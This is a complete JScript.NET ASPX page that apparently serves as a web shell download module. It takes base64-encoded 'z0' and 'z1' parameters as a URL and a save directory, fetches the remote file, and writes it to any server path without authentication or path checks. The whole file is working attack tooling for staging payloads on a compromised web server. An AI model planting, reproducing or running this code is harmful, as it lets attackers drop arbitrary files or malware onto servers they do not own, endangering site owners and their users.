<%

function GetCurrentCharset() : String {
    var charset : String = System.Web.HttpContext.Current.Response.Charset;
    
    if (charset == null || charset == "") {
        switch (System.Web.HttpContext.Current.Session.CodePage) {
            case 65001: charset = "utf-8"; break;
            case 1252:  charset = "windows-1252"; break;
            case 936:   charset = "gb2312"; break;
            case 950:   charset = "big5"; break;
            case 1251:  charset = "windows-1251"; break;
            default:    charset = "utf-8"; break;
        }
    }
    return charset;
}

function Base64Decode(str : String) : String {
    try {
        var encBytes : Byte[] = System.Convert.FromBase64String(str);
        var encoding : System.Text.Encoding = System.Text.Encoding.GetEncoding(GetCurrentCharset());
        return encoding.GetString(encBytes);
    } catch(e) {
        return "";
    }
}

function ParseFilename(headerStr : String) : String {
    if (headerStr == null || headerStr == "") return "";
    try {
        var regEx : System.Text.RegularExpressions.Regex = new System.Text.RegularExpressions.Regex('filename="?([^";]+)"?', System.Text.RegularExpressions.RegexOptions.IgnoreCase);
        var match : System.Text.RegularExpressions.Match = regEx.Match(headerStr);
        if (match.Success) {
            return match.Groups[1].Value;
        }
    } catch(e) {}
    return "";
}

function FormatJson(success : boolean, errorMsg : String, filename : String, path : String) : String {
    if (success) {
        return '{"success":true,"filename":"' + filename + '","path":"' + path.replace(/\\/g, '\\\\') + '"}';
    } else {
        return '{"success":false,"error":"' + errorMsg + '"}';
    }
}

function Main() : String {
    var z0 : String = System.Web.HttpContext.Current.Request.Item["z0"];
    var z1 : String = System.Web.HttpContext.Current.Request.Item["z1"];

    if (z0 == null || z0.Trim() == "" || z1 == null || z1.Trim() == "") {
        return FormatJson(false, "Missing parameters (z0 or z1)", "", "");
    }

    var url : String = Base64Decode(z0);
    var save_dir : String = Base64Decode(z1);

    if (url == "" || save_dir == "") {
        return FormatJson(false, "Invalid base64 encoding in parameters", "", "");
    }

    try {
        url = System.Web.HttpUtility.UrlDecode(url);
    } catch(e) {
        return FormatJson(false, "URL Decode failed: " + e.message, "", "");
    }

    var response : System.Net.HttpWebResponse = null;
    try {
        System.Net.ServicePointManager.SecurityProtocol = 3072; // TLS 1.2

        var request : System.Net.HttpWebRequest = System.Net.HttpWebRequest(System.Net.WebRequest.Create(url));
        request.Method = "GET";
        request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        
        response = System.Net.HttpWebResponse(request.GetResponse());
    } catch(e) {
        return FormatJson(false, "Download failed (Connection or HTTP error: " + e.message + ")", "", "");
    }

    var filename : String = "";
    try {
        var cdHeader : String = response.Headers["Content-Disposition"];
        filename = ParseFilename(cdHeader);
    } catch(e) {}

    if (filename == null || filename == "") {
        var urlPath : String = url;
        if (urlPath.indexOf("?") > -1) urlPath = urlPath.split("?")[0];
        if (urlPath.indexOf("/") > -1) {
            filename = urlPath.substring(urlPath.lastIndexOf("/") + 1);
        }
    }

    if (filename == null || filename == "" || filename == "/") {
        filename = "download.bin";
    }

    if (!save_dir.EndsWith("/") && !save_dir.EndsWith("\\")) {
        save_dir += '\\';
    }
    var filePath : String = save_dir + filename;

    try {
        var responseStream : System.IO.Stream = response.GetResponseStream();
        var fileStream : System.IO.FileStream = new System.IO.FileStream(filePath, System.IO.FileMode.Create);
        
        var buffer : Byte[] = new Byte[4096];
        var bytesRead : int;
        while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0) {
            fileStream.Write(buffer, 0, bytesRead);
        }
        
        fileStream.Close();
        responseStream.Close();
        response.Close();
        
        return FormatJson(true, "", filename, filePath);
    } catch(e) {
        if (response != null) response.Close();
        return FormatJson(false, "Save file failed: " + e.message, "", "");
    }
}

System.Web.HttpContext.Current.Response.ContentType = "application/json";
System.Web.HttpContext.Current.Response.Write(Main());

%>